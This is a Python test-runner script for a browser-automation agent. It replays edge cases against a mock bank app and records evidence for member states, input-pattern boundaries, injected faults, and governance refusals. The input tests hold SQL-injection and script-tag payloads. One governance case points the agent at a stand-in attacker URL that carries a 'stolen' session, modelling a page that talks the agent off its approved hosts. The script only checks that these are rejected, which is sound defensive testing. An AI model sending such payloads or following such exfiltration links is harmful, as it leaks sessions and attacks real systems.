"""Run the edge cases against the live mock app and keep the evidence.

`make demo` shows the story; the test suite proves the claims in memory and leaves nothing behind.
This is the third thing a reviewer wants: the hostile and boundary conditions actually run, through
the same replay executor, dispatcher, policy and evidence bus as the demo, with every run saved so
it can be opened and read.

Each scenario states what it proves and what it expects (terminal status, exit code, outcome or
error code, dispatch count). A scenario that deviates fails the script. Every scenario runs against
its own fresh mock app, so an armed fault or a session cannot leak from one to the next.

Run: python scripts/run_edge_cases.py       (or: make edge-cases)
Writes: evidence/edge-cases/<scenario>/ plus SUMMARY.md and summary.json
"""

from __future__ import annotations

import json
import os
import shutil
import sys
from dataclasses import dataclass
from pathlib import Path
from typing import Any

ROOT = Path(__file__).resolve().parents[1]
os.chdir(ROOT)  # the policy file, the catalog and the evidence root are all relative
sys.path.insert(0, str(ROOT))  # `apps/` is a fixture, not part of the installed package

import httpx  # noqa: E402
from apps.mock_bank.server import VALID_PW, VALID_USER  # noqa: E402

from cua.cli.demo import Demo  # noqa: E402
from cua.domain.action import Navigate  # noqa: E402
from cua.domain.actor import Actor  # noqa: E402
from cua.domain.result import FailureCode, RunStatus  # noqa: E402
from cua.domain.serde import dump_capability, load_capability  # noqa: E402
from cua.domain.tenant_binding import TenantBinding  # noqa: E402
from cua.policy.secrets import SecretResolver  # noqa: E402
from cua.replay.executor import ReplayExecutor  # noqa: E402
from cua.runtime.capture import FailureCapture  # noqa: E402
from cua.runtime.dispatcher import DispatchStatus  # noqa: E402

KIND = "edge-cases"
OUT = ROOT / "evidence" / KIND
REFERENCE = ROOT / "tests/fixtures/capabilities/savings_balance.yaml"
SIGN_ON = ROOT / "tests/fixtures/capabilities/sign_on.yaml"


@dataclass(frozen=True)
class Scenario:
    name: str
    proves: str
    inputs: dict[str, str]
    status: RunStatus
    exit_code: int
    fault: tuple[str, int] | None = None
    outcome: str | None = None
    error: FailureCode | None = None
    outputs: dict[str, str] | None = None
    recovery_attempts: int | None = None
    dispatches: int | None = None
    reauth: bool = False


S = Scenario
OK = RunStatus.SUCCESS
BIZ = RunStatus.BUSINESS_OUTCOME
HUMAN = RunStatus.NEEDS_HUMAN
FAIL = RunStatus.FAILED
REJECTED = FailureCode.INPUT_VALIDATION_FAILED

SCENARIOS: tuple[Scenario, ...] = (
    # --- every state a member can be in ---------------------------------------------------
    S(
        "member-active",
        "The straightforward case: an answer with three typed outputs.",
        {"member_id": "12345"},
        OK,
        0,
        outputs={"savings_balance": "4210.55", "account_status": "Active"},
    ),
    S(
        "member-closed-account",
        "A closed savings account with a $0.00 balance is still an answer, not an error.",
        {"member_id": "24680"},
        OK,
        0,
        outputs={"savings_balance": "0.00", "account_status": "Closed"},
    ),
    S(
        "member-no-savings",
        "Checking-only member: a declared business outcome, exit 0.",
        {"member_id": "13579"},
        BIZ,
        0,
        outcome="no_savings_account",
    ),
    S(
        "member-restricted",
        "The application denies the record: `permission_denied`, an answer, exit 0.",
        {"member_id": "55555"},
        BIZ,
        0,
        outcome="permission_denied",
    ),
    S(
        "member-not-found",
        "'No such member' is a legitimate answer the caller needs, not a crash.",
        {"member_id": "99999"},
        BIZ,
        0,
        outcome="member_not_found",
    ),
    # --- the declared input pattern, at and around its boundaries -------------------------
    S(
        "input-minimum-length",
        "Four digits is the shortest the pattern allows: accepted, and simply not found.",
        {"member_id": "1234"},
        BIZ,
        0,
        outcome="member_not_found",
    ),
    S(
        "input-maximum-length",
        "Ten digits is the longest the pattern allows: accepted, and simply not found.",
        {"member_id": "1234567890"},
        BIZ,
        0,
        outcome="member_not_found",
    ),
    S(
        "input-too-short",
        "Three digits: rejected before the browser moves.",
        {"member_id": "123"},
        FAIL,
        1,
        error=REJECTED,
        dispatches=0,
    ),
    S(
        "input-too-long",
        "Eleven digits: rejected before the browser moves.",
        {"member_id": "12345678901"},
        FAIL,
        1,
        error=REJECTED,
        dispatches=0,
    ),
    S(
        "input-empty",
        "An empty value: rejected, zero actions.",
        {"member_id": ""},
        FAIL,
        1,
        error=REJECTED,
        dispatches=0,
    ),
    S(
        "input-padded-with-space",
        "A leading space is not a digit: rejected, never trimmed into validity.",
        {"member_id": " 12345"},
        FAIL,
        1,
        error=REJECTED,
        dispatches=0,
    ),
    S(
        "input-non-ascii-digits",
        "Arabic-Indic digits look like a number and are not one: rejected.",
        {"member_id": "\u0661\u0662\u0663\u0664\u0665"},
        FAIL,
        1,
        error=REJECTED,
        dispatches=0,
    ),
    S(
        "input-sql-shaped",
        "Injection-shaped text never reaches the application.",
        {"member_id": "1'; DROP TABLE members; --"},
        FAIL,
        1,
        error=REJECTED,
        dispatches=0,
    ),
    S(
        "input-html-shaped",
        "Markup in an input is refused at the door.",
        {"member_id": "<script>alert(1)</script>"},
        FAIL,
        1,
        error=REJECTED,
        dispatches=0,
    ),
    # --- faults the application throws at a run --------------------------------------------
    S(
        "fault-transient-recovered",
        "A 502 matches the declared `transient_load` rule; the run recovers and finishes.",
        {"member_id": "12345"},
        OK,
        0,
        fault=("transient_load", 1),
        recovery_attempts=1,
        outputs={"savings_balance": "4210.55"},
    ),
    S(
        "fault-transient-exhausted",
        "A 502 that never clears: recovery is bounded, so it ends as RECOVERY_EXHAUSTED "
        "and asks a human.",
        {"member_id": "12345"},
        HUMAN,
        2,
        fault=("transient_load", 9),
        error=FailureCode.RECOVERY_EXHAUSTED,
    ),
    S(
        "fault-session-expired-reauth",
        "The session silently expires; the declared remedy signs in again through policy and the "
        "run finishes.",
        {"member_id": "12345"},
        OK,
        0,
        fault=("session_timeout", 1),
        recovery_attempts=1,
        reauth=True,
        outputs={"savings_balance": "4210.55"},
    ),
    S(
        "fault-session-expired-no-remedy",
        "The same expiry when the remedy cannot run: recovery is exhausted and a human is asked, "
        "rather than the run guessing its way on.",
        {"member_id": "12345"},
        HUMAN,
        2,
        fault=("session_timeout", 1),
        error=FailureCode.RECOVERY_EXHAUSTED,
    ),
    S(
        "fault-undeclared-screen",
        "A friendly 'System Notice' nobody declared appears. It is NOT clicked through: "
        "unknown state, fail closed.",
        {"member_id": "12345"},
        HUMAN,
        2,
        fault=("undeclared_dialog", 3),
        error=FailureCode.UNEXPECTED_STATE,
    ),
)

# Snapshots are what a reviewer needs where a run STOPPED; where it simply answered they are the
# bulk of the bytes and add nothing the trace does not say. Kept only for runs that stopped.
KEEP_SNAPSHOTS_FOR = {RunStatus.NEEDS_HUMAN}


def _cell(text: object) -> str:
    return str(text).replace("|", "\\|").replace("\n", " ")


def _display(inputs: dict[str, str]) -> str:
    return ", ".join(f"{k}={v!r}" for k, v in inputs.items())


def _dispatch_count(events: list[dict[str, Any]]) -> int:
    return sum(1 for e in events if e["event"] == "dispatch" and not e.get("refused"))


def _check(sc: Scenario, observed: dict[str, Any]) -> list[str]:
    problems: list[str] = []

    def expect(label: str, want: object, got: object) -> None:
        if want is not None and want != got:
            problems.append(f"{label}: expected {want!r}, observed {got!r}")

    expect("status", sc.status.value, observed["status"])
    expect("exit code", sc.exit_code, observed["exit_code"])
    expect("outcome", sc.outcome, observed["outcome"])
    expect("error", sc.error.value if sc.error else None, observed["error"])
    expect("recovery attempts", sc.recovery_attempts, observed["recovery_attempts"])
    expect("dispatches", sc.dispatches, observed["dispatches"])
    for name, value in (sc.outputs or {}).items():
        expect(f"output {name}", value, observed["outputs"].get(name))
    if observed["unauthorized_dispatches"]:
        problems.append(f"{observed['unauthorized_dispatches']} unauthorized dispatch(es)")
    return problems


def run_replay(demo: Demo, sc: Scenario) -> dict[str, Any]:
    with demo.app() as base_url:
        reference = demo.reference(base_url)
        rig = demo.rig(base_url, KIND, sc.name, vision=False)
        try:
            demo.sign_in(rig, base_url)
            # Armed AFTER sign-in: arming first lets the sign-in navigation consume the fault.
            if sc.fault is not None:
                httpx.post(
                    f"{base_url}/_control/arm", json={"fault": sc.fault[0], "count": sc.fault[1]}
                )
            executor = ReplayExecutor(
                dispatcher=rig.dispatcher,
                evidence=rig.evidence,
                capture=FailureCapture(driver=rig.driver, evidence=rig.evidence),
            )
            if sc.reauth:
                sign_on = TenantBinding(
                    capability_ref="corebank.auth.sign_on@1.0.0",
                    tenant="edge-cases",
                    vars={"base_url": base_url},
                ).apply(load_capability(SIGN_ON.read_text(encoding="utf-8")))
                executor.capabilities = {sign_on.id: sign_on}.__getitem__
                rig.dispatcher.secrets = SecretResolver(
                    overrides={
                        "corebank.operator_id": VALID_USER,
                        "corebank.operator_password": VALID_PW,
                    },
                    redactor=rig.evidence.redactor,
                )
            result = executor.run(reference, sc.inputs)
            events = rig.evidence.read_events()
            unauthorized = len(rig.evidence.unauthorized_dispatches())
        finally:
            rig.close()

    if result.status not in KEEP_SNAPSHOTS_FOR:
        shutil.rmtree(OUT / sc.name / "snapshots", ignore_errors=True)
    return {
        "status": result.status.value,
        "exit_code": result.exit_code,
        "summary": result.summary,
        "outcome": result.outcome.code if result.outcome else None,
        "error": result.error.code.value if result.error else None,
        "outputs": result.outputs,
        "recovery_attempts": result.recovery_attempts,
        "dispatches": _dispatch_count(events),
        "unauthorized_dispatches": unauthorized,
    }


# ------------------------------------------------------------------------------ governance


@dataclass(frozen=True)
class Governance:
    name: str
    proves: str
    expected: str


GOVERNANCE: tuple[Governance, ...] = (
    Governance(
        "governance-tampered-artifact",
        "A capability edited after it was sealed is refused: the content hash is the contract.",
        "refused: content hash mismatch",
    ),
    Governance(
        "governance-off-allowlist-navigation",
        "A page that talks the agent into leaving the approved hosts is refused by policy, "
        "outside the model.",
        "DENIED / navigation_blocked, browser did not move",
    ),
    Governance(
        "governance-stale-lease",
        "Automation acting after a human took the session is refused (LEASE_LOST) and is not "
        "counted as a dispatch.",
        "LEASE_LOST, nothing dispatched, 0 unauthorized",
    ),
)


def _tampered_artifact() -> tuple[dict[str, Any], bool, str]:
    sealed = dump_capability(load_capability(REFERENCE.read_text(encoding="utf-8")))
    # Sealed first (hash computed), then one word edited: only the edit should be refused.
    edited = sealed.replace("Look up a member", "Look up any member", 1)
    if edited == sealed:
        edited = sealed.replace("title:", "title: (edited)", 1)
    try:
        load_capability(edited)
    except ValueError as exc:
        reason = str(exc).splitlines()[0]
        # The full message carries two 64-character hashes; the sentence before them is the point.
        return (
            {"refused": True, "reason": reason},
            "content hash mismatch" in reason,
            reason.split(":", 1)[0],
        )
    return (
        {"refused": False, "reason": "an edited artifact loaded"},
        False,
        "an edited artifact loaded",
    )


def run_governance(demo: Demo, case: Governance) -> tuple[bool, str]:
    case_dir = OUT / case.name
    if case.name == "governance-tampered-artifact":
        observed, ok, description = _tampered_artifact()
        case_dir.mkdir(parents=True, exist_ok=True)
        (case_dir / "result.json").write_text(
            json.dumps(observed, indent=2) + "\n", encoding="utf-8"
        )
        return ok, description

    with demo.app() as base_url:
        rig = demo.rig(base_url, KIND, case.name, vision=False)
        try:
            demo.sign_in(rig, base_url)
            before = rig.driver.page.url
            if case.name == "governance-off-allowlist-navigation":
                outcome = rig.dispatcher.execute(
                    Navigate(url="http://evil.example.com/collect?session=stolen"),
                    snapshot=rig.dispatcher.observe(),
                    actor=Actor.AUTOMATION,
                    session_id=case.name,
                    lease_epoch=0,
                )
                code = outcome.failure_code.value if outcome.failure_code else None
                stayed = rig.driver.page.url == before
                ok = (
                    outcome.status is DispatchStatus.DENIED
                    and code == FailureCode.NAVIGATION_BLOCKED.value
                    and stayed
                )
                description = f"{outcome.status.value} / {code}, browser did not move: {stayed}"
            else:  # governance-stale-lease
                outcome = rig.dispatcher.execute(
                    Navigate(url=base_url + "/"),
                    snapshot=rig.dispatcher.observe(),
                    actor=Actor.AUTOMATION,
                    session_id=case.name,
                    lease_epoch=1,
                    expected_epoch=3,  # a human claimed the session at epoch 3
                )
                events = rig.evidence.read_events()
                unauthorized = len(rig.evidence.unauthorized_dispatches())
                ok = (
                    outcome.status is DispatchStatus.LEASE_LOST
                    and rig.driver.page.url == before
                    and unauthorized == 0
                    and _dispatch_count(events) == 0
                )
                description = (
                    f"{outcome.status.value}, dispatched={_dispatch_count(events)}, "
                    f"unauthorized={unauthorized}"
                )
            observed = {"status": outcome.status.value, "message": outcome.message, "ok": ok}
        finally:
            rig.close()
    (case_dir / "result.json").write_text(json.dumps(observed, indent=2) + "\n", encoding="utf-8")
    shutil.rmtree(case_dir / "snapshots", ignore_errors=True)
    return ok, description


# --------------------------------------------------------------------------------- driver


def main() -> int:
    if OUT.exists():
        shutil.rmtree(OUT)
    OUT.mkdir(parents=True)
    demo = Demo(headless=True)
    rows: list[dict[str, Any]] = []
    failed = 0

    for sc in SCENARIOS:
        observed = run_replay(demo, sc)
        problems = _check(sc, observed)
        failed += bool(problems)
        expected = f"{sc.status.value}, exit {sc.exit_code}"
        if sc.outcome:
            expected += f", {sc.outcome}"
        if sc.error:
            expected += f", {sc.error.value}"
        seen = f"{observed['status']}, exit {observed['exit_code']}"
        if observed["outcome"]:
            seen += f", {observed['outcome']}"
        if observed["error"]:
            seen += f", {observed['error']}"
        seen += f", {observed['dispatches']} dispatch(es)"
        rows.append(
            {
                "scenario": sc.name,
                "group": sc.name.split("-")[0],
                "proves": sc.proves,
                "input": _display(sc.inputs) + (f"  + fault {sc.fault[0]}" if sc.fault else ""),
                "expected": expected,
                "observed": seen,
                "passed": not problems,
                "problems": problems,
            }
        )
        print(f"{'PASS' if not problems else 'FAIL':4} {sc.name}  {seen}")
        for problem in problems:
            print(f"       {problem}")

    for case in GOVERNANCE:
        ok, description = run_governance(demo, case)
        failed += not ok
        rows.append(
            {
                "scenario": case.name,
                "group": "governance",
                "proves": case.proves,
                "input": (
                    "(sealed artifact, one word edited)"
                    if case.name == "governance-tampered-artifact"
                    else "(direct call through the dispatcher)"
                ),
                "expected": case.expected,
                "observed": description,
                "passed": ok,
                "problems": [] if ok else [description],
            }
        )
        print(f"{'PASS' if ok else 'FAIL':4} {case.name}  {description}")

    write_summary(rows)
    total = len(rows)
    print(f"\n{total - failed}/{total} scenarios behaved as expected -> evidence/edge-cases/")
    return 1 if failed else 0


GROUPS = (
    ("member", "Every state a member can be in"),
    ("input", "The declared input pattern, at and around its boundaries"),
    ("fault", "Faults the application throws at a run"),
    ("governance", "Governance: the system refusing what it must refuse"),
)


def write_summary(rows: list[dict[str, Any]]) -> None:
    (OUT / "summary.json").write_text(
        json.dumps({"scenarios": rows}, indent=2) + "\n", encoding="utf-8"
    )
    passed = sum(1 for r in rows if r["passed"])
    lines = [
        "# Edge-case runs",
        "",
        "The hostile and boundary conditions, actually run: each scenario is a real replay (or a",
        "direct call through the dispatcher) against a fresh mock app, through the same executor,",
        "policy chokepoint and evidence bus as `make demo`. Every run is saved next to this file:",
        "open `<scenario>/run_record.json` for the result and `<scenario>/trace.jsonl` for the",
        "event-by-event story. Regenerate with `make edge-cases`; a deviating scenario fails it.",
        "",
        f"**{passed} of {len(rows)} scenarios behaved exactly as expected.**",
        "",
        "Snapshots are kept only for runs that *stopped* (a human was needed), where they are the",
        "evidence; where a run simply answered they would only repeat what the trace already says.",
        "",
    ]
    for key, title in GROUPS:
        group_rows = [r for r in rows if r["group"] == key]
        if not group_rows:
            continue
        lines += [
            f"## {title}",
            "",
            "| Scenario | What it proves | Input | Expected | Observed | |",
            "|---|---|---|---|---|---|",
        ]
        for r in group_rows:
            mark = "PASS" if r["passed"] else "**FAIL**"
            lines.append(
                f"| [`{r['scenario']}`]({r['scenario']}/) | {_cell(r['proves'])} "
                f"| {_cell(r['input'])} | {_cell(r['expected'])} | {_cell(r['observed'])} "
                f"| {mark} |"
            )
        lines.append("")
    (OUT / "SUMMARY.md").write_text("\n".join(lines), encoding="utf-8")


if __name__ == "__main__":
    sys.exit(main())
